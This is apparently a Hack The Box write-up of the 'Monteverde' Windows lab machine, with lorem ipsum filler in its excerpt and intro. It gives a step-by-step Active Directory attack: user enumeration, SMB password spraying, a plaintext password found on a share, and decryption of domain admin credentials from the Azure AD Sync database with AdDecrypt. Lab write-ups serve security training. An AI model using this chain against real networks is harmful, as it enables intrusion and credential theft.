---
layout: single
title: Monteverde - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2020-01-21
classes: wide
header:
  teaser: /assets/images/htb-writeup-monteverde/monteverde_logo.png
  teaser_home_page: true
  icon: /assets/images/windows.png
categories:
  - hackthebox
  - infosec
tags:  
  - windows
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-monteverde/monteverde_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. root@p3:/opt/htb/machines/monteverde# nmapAutomatorDirb.sh 10.10.10.172 All
    PORT      STATE SERVICE
    53/tcp    open  domain
    88/tcp    open  kerberos-sec
    135/tcp   open  msrpc
    139/tcp   open  netbios-ssn
    389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
    445/tcp   open  microsoft-ds
    464/tcp   open  kpasswd5
    593/tcp   open  http-rpc-epmap
    636/tcp   open  ldapssl
    3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
    3269/tcp  open  globalcatLDAPssl
    5985/tcp  open  wsman
    9389/tcp  open  mc-nmf     .NET Message Framing
    49667/tcp open  msrpc      Microsoft Windows RPC
    49669/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
    49670/tcp open  msrpc      Microsoft Windows RPC
    49673/tcp open  msrpc      Microsoft Windows RPC
    49702/tcp open  msrpc      Microsoft Windows RPC
    49771/tcp open  msrpc      Microsoft Windows RPC

    PORT    STATE SERVICE VERSION
    53/udp  open  domain  (generic dns response: SERVFAIL)
    123/udp open  ntp     NTP v3
    389/udp open  ldap    Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)

    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    Domain: Megabank.local0


2. Enum domain users with rpcclient.
    root@p3:/opt/htb/machines/monteverde# rpcclient -U "" 10.10.10.172
      rpcclient $> enumdomusers
      user:[Guest] rid:[0x1f5]
      user:[AAD_987d7f2f57d2] rid:[0x450]
      user:[mhope] rid:[0x641]
      user:[SABatchJobs] rid:[0xa2a]
      user:[svc-ata] rid:[0xa2b]
      user:[svc-bexec] rid:[0xa2c]
      user:[svc-netapp] rid:[0xa2d]
      user:[dgalanos] rid:[0xa35]
      user:[roleary] rid:[0xa36]
      user:[smorgan] rid:[0xa37]

    Enumerate each account (queryuser) and we find that mhope (Mike Hope) and AAD_987d7f2f57d2 is the only accounts with a login_count
    higher then 0. AAD_987d7f2f57d2 has an interesting description, giving us an installation identifier.

      rpcclient $> queryuser 0x450
      	User Name   :	AAD_987d7f2f57d2
      	Full Name   :	AAD_987d7f2f57d2
        ..
      	Description :	Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
        ..
      	user_rid :	0x450
      	group_rid:	0x201
        ..
      	logon_count:	0x00000009
        ..

    We are unable to get any account hashes using Impacket GetNPUsers.py as the accounts doesn't have UF_DONT_REQUIRE_PREAUTH.


3. Enumerate SMB. We are unable to get any info using smbclient and anonymous login. Using msf we can enumerate the accounts with
   found users. As we don't have any passwords yet we try to set 'USER_AS_PASS' as TRUE.

    msf5 auxiliary(scanner/smb/smb_login) > options
      Name               Current Setting        Required  Description
      ----               ---------------        --------  -----------
      RHOSTS             10.10.10.172           yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
      RPORT              445                    yes       The SMB service port (TCP)
      SMBDomain          megabank.local         no        The Windows domain to use for authentication
      USER_AS_PASS       true                   no        Try the username as the password for all users
      USER_FILE          users-monteverde.txt   no        File containing usernames, one per line

    msf5 auxiliary(scanner/smb/smb_login) > run

      [*] 10.10.10.172:445      - 10.10.10.172:445 - Starting SMB login bruteforce
      ..
      [-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: 'megabank.local\mhope:mhope',
      [+] 10.10.10.172:445      - 10.10.10.172:445 - Success: 'megabank.local\SABatchJobs:SABatchJobs'
      [-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: 'megabank.local\svc-ata:svc-ata',
      ..

    We find one matching credential for SMB - SABatchJobs:SABatchJobs


4. Enumerate SMB further using smbclient and the found credentials.
    root@p3:/opt/htb/machines/monteverde# smbclient -L 10.10.10.172 -U SABatchJobs
      Enter WORKGROUP\SABatchJobs's password:

      	Sharename       Type      Comment
      	---------       ----      -------
      	ADMIN$          Disk      Remote Admin
      	azure_uploads   Disk
      	C$              Disk      Default share
      	E$              Disk      Default share
      	IPC$            IPC       Remote IPC
      	NETLOGON        Disk      Logon server share
      	SYSVOL          Disk      Logon server share
      	users$          Disk

    The share 'azure_uploads' is empty, however looking in 'users$' we find an interesting .xml containing a password.
      root@p3:/opt/htb/machines/monteverde# smbclient \\\\10.10.10.172\\users$ -U SABatchJobs
        smb: \> dir
          .                                   D        0  Fri Jan  3 14:12:48 2020
          ..                                  D        0  Fri Jan  3 14:12:48 2020
          dgalanos                            D        0  Fri Jan  3 14:12:30 2020
          mhope                               D        0  Fri Jan  3 14:41:18 2020
          roleary                             D        0  Fri Jan  3 14:10:30 2020
          smorgan                             D        0  Fri Jan  3 14:10:24 2020
        smb: \> cd mhope
        smb: \mhope\> dir
          .                                   D        0  Fri Jan  3 14:41:18 2020
          ..                                  D        0  Fri Jan  3 14:41:18 2020
          azure.xml                          AR     1212  Fri Jan  3 14:40:23 2020

      root@p3:/opt/htb/machines/monteverde# cat azure.xml
        ..
          <S N="Password">4n0therD4y@n0th3r$</S>
        ..

    NOTE: Credentials - mhope:4n0therD4y@n0th3r$


5. Login with evil-winrm using found credentials for mhope, grab user.txt.
    root@p3:/opt/htb/machines/monteverde# evil-winrm -i monteverde.htb -u mhope -p 4n0therD4y@n0th3r$
      *Evil-WinRM* PS C:\Users\mhope\Desktop> type user.txt
        4961****************************


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Looking at the directory of mhope we find the dir .Azure hinting that this privesc should/have somnething to do with Azure.
   We find a TokenCache containing lots of information that might be valuable. Also something called 'Microsoft Azure AD Sync'
   in C:\Program Files\.

   Enumerating the box further tells us that it's running sqlserver locally (tcp 1433), this sounds like a promising point to start.

   *Evil-WinRM* PS C:\Users\Administrator\Documents> netstat -aon
     Active Connections
       Proto  Local Address          Foreign Address        State           PID
       ..
       TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       3512
       ..
       TCP    10.10.10.172:1433      10.10.10.172:49720     ESTABLISHED     3512
       TCP    10.10.10.172:1433      10.10.10.172:49721     ESTABLISHED     3512
       TCP    10.10.10.172:1433      10.10.10.172:49722     ESTABLISHED     3512
       TCP    10.10.10.172:1433      10.10.10.172:49723     ESTABLISHED     3512
       TCP    10.10.10.172:1433      10.10.10.172:49724     ESTABLISHED     3512


2. Reading about Azure AD Sync it is the service responsible for syncing data between your local domain and the Azure based domain.
   The service needs privileged credentials from the local domain in order to sync, meaning this could potentially be exploited.

   Googling "Azure AD sync exploit" we find an article explaining how to Priv Esc using Azure AD Connect Database, and even has
   a compiled program to do it for you, see link below under 'Information'.

3. Download the program and upload the .exe and .dll to the vicitm host (C:\temp\AdDecrypt)
   In order for the program to work we need to 'stand' in the ADSync directory.

   *Evil-WinRM* PS C:\temp\AdDecrypt> dir

         Directory: C:\temp\AdDecrypt


     Mode                LastWriteTime         Length Name
     ----                -------------         ------ ----
     -a----        1/22/2020  12:29 AM          14848 AdDecrypt.exe
     -a----        1/22/2020  12:29 AM         334248 mcrypt.dll

   *Evil-WinRM* PS C:\temp\AdDecrypt> cd C:\"Program Files"\"Microsoft Azure AD Sync"\Bin
   *Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin>
   *Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin> C:\temp\AdDecrypt\AdDecrypt.exe -FullSQL

    ======================
    AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
    Based on original code from: https://github.com/fox-it/adconnectdump
    ======================

    Opening database connection...
    Executing SQL commands...
    Closing database connection...
    Decrypting XML...
    Parsing XML...
    Finished!

    DECRYPTED CREDENTIALS:
    Username: administrator
    Password: d0m@in4dminyeah!
    Domain: MEGABANK.LOCAL

   NOTE: If the program doesn't work, try to import the ADSync module and run it again. Import-Module ADSync
         Also, the .exe is polling SQL with "Server=LocalHost;Database=ADSync;Trusted_Connection=True;". Luckily this is the
         exact structure of the database on Monteverde box, in other circumstances we would need to re-compile the .exe.


4. Login with found admin credentials and grab root.txt

    root@p3:/opt/htb/machines/monteverde# evil-winrm -i monteverde.htb -u administrator -p d0m@in4dminyeah!
    *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
      megabank\administrator
    *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
      1290****************************


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

PrivEsc, ADSync Exploit
  https://vbscrub.video.blog/2020/01/14/azure-ad-connect-database-exploit-priv-esc/
